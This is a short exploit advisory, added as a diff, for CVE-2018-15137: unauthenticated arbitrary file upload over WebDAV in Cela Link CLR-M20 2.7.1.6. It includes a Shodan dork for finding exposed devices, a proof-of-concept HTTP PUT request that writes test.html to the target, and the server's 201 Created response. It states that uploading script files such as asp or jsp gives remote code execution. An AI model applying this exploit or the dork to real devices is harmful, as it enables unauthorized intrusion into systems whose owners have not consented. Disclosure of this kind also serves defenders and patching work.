@@ -1,0 +1,41 @@
+# Exploit Title: Cela Link CLR-M20 2.7.1.6 - Arbitrary File Upload
+# Date: 2018-07-13
+# Shodan Dork: CLR-M20
+# Exploit Author: Safak Aslan
+# Software Link: http://www.celalink.com
+# Version: 2.7.1.6
+# CVE: 2018-15137
+# Authentication Required: No
+# Tested on: Windows
+
+# Vulnerability Description
+# Due to the Via WebDAV (Web Distributed Authoring and Versioning),
+# on the remote server, Cela Link CLR-M20 allows unauthorized users to upload
+# any file(e.g. asp, aspx, cfm, html, jhtml, jsp, shtml) which causes
+# remote code execution as well.
+# Due to the WebDAV, it is possible to upload the arbitrary
+# file utilizing the PUT method.
+
+# Proof-of-Concept
+# Request
+
+PUT /test.html HTTP/1.1
+Host: targetIP
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en,tr-TR;q=0.8,tr;q=0.5,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Length: 26
+
+the reflection of random numbers 1230123012
+
+# Response
+
+HTTP/1.1 201 Created
+Content-Length: 0
+Date: Fri, 13 Jul 2018 14:38:54 GMT
+Server: lighttpd/1.4.20
+
+As a result, on the targetIP/test.html, "the reflection of random numbers
+1230123012" is reflected on the page.
